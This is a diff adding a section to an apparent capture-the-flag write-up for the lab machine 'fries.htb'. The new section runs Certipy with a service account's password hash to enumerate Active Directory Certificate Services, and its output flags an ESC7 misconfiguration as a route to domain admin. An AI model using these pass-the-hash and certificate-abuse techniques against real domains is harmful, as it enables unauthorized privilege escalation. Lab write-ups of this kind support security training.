@@ -965,6 +965,68 @@ This new user part of the remote management group
 
 And since this is a CA account, its a good idea to try and enumerate ADCS attacks
 
+# Domain Admin via ADCS
+
+```python
+certipy-ad find -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -dc-host dc01.fries.htb -dc-ip 10.129.244.72 -stdout -enabled -vulnerable
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 16 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'fries-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'fries-DC01-CA'
+[*] Checking web enrollment for CA 'fries-DC01-CA' @ 'DC01.fries.htb'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : fries-DC01-CA
+    DNS Name                            : DC01.fries.htb
+    Certificate Subject                 : CN=fries-DC01-CA, DC=fries, DC=htb
+    Certificate Serial Number           : 26117C1FFA5705AF443B7E82E8C639A9
+    Certificate Validity Start          : 2025-11-18 05:39:18+00:00
+    Certificate Validity End            : 3024-05-19 14:11:46+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : FRIES.HTB\Administrators
+      Access Rights
+        ManageCa                        : FRIES.HTB\gMSA_CA_prod
+                                          FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+                                          FRIES.HTB\Administrators
+        Enroll                          : FRIES.HTB\gMSA_CA_prod
+                                          FRIES.HTB\Domain Users
+                                          FRIES.HTB\Domain Computers
+                                          FRIES.HTB\Authenticated Users
+        ManageCertificates              : FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+                                          FRIES.HTB\Administrators
+    [+] User Enrollable Principals      : FRIES.HTB\Domain Computers
+                                          FRIES.HTB\Authenticated Users
+                                          FRIES.HTB\Domain Users
+                                          FRIES.HTB\gMSA_CA_prod
+    [+] User ACL Principals             : FRIES.HTB\gMSA_CA_prod
+    [!] Vulnerabilities
+      ESC7                              : User has dangerous permissions.
+Certificate Templates                   : [!] Could not find any certificate templates
+```
+
+## ESC7
+
 
 
 
